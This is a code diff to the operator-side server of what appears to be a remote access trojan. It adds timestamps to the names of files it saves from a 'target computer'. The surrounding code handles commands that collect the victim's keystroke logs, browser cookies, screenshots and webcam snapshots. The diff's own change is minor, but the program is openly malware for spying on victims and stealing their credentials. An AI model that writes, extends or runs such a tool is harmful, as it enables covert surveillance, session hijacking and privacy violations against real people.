@@ -5,6 +5,7 @@ import os
 import argparse
 from modules import version_control
 import time
+import datetime
 
 
 class Server:
@@ -72,6 +73,11 @@ class Server:
             else:
                 return "The file downloaded from target computer successfully."
 
+    def get_file_datetime(self):
+        date = datetime.datetime.now()
+        file_date = str(date.hour) + ":" + str(date.minute) + ":" + str(date.second) + " "
+        return file_date
+
     def server_main(self):
         while True:
             self.command_input = input("Enter Command :")
@@ -86,13 +92,13 @@ class Server:
                 if self.command_input[0] == "get_file":
                     command_output = self.save_file(self.command_input[1], command_output)
                 elif self.command_input[0] == "save_keys":
-                    command_output = self.save_file("keylog.txt", command_output)
+                    command_output = self.save_file(self.get_file_datetime() + "target_keylog.txt", command_output)
                 elif self.command_input[0] == "get_browser_cookies":
-                    command_output = self.save_file("target_cookie.txt", command_output)
+                    command_output = self.save_file(self.get_file_datetime() + "target_cookie.txt", command_output)
                 elif self.command_input[0] == "get_screen":
-                    command_output = self.save_file("target_screen.png", command_output)
+                    command_output = self.save_file(self.get_file_datetime() + "target_screen.png", command_output)
                 elif self.command_input[0] == "get_camera":
-                    command_output = self.save_file("target_camera_snapshot.png", command_output)
+                    command_output = self.save_file(self.get_file_datetime() + "target_camera_snapshot.png", command_output)
                 print(command_output)
 
             except Exception:
